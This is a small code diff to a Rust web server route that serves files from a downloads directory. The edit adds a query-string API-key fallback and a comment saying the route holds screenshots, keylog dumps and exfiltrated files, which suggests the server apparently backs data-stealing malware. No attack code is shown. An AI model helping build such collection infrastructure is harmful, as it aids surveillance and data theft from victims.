@@ -7,7 +7,10 @@
 // GET /api/downloads/*path
 //   Serves any file under the server-side `downloads/` directory.
 //   Path traversal is blocked by rejecting `..` components.
-//   Requires X-API-KEY auth (applied by the router's middleware layer).
+//   Requires X-API-KEY auth (enforced by the router's middleware layer;
+//   ?key=<api_key> is accepted as a fallback for <img>/<a href> uses).
+//   NOTE: this route must never be registered in public_routes — it serves
+//   screenshots, keylog dumps, and exfiltrated files.
 
 use axum::{
     extract::{Path, State},
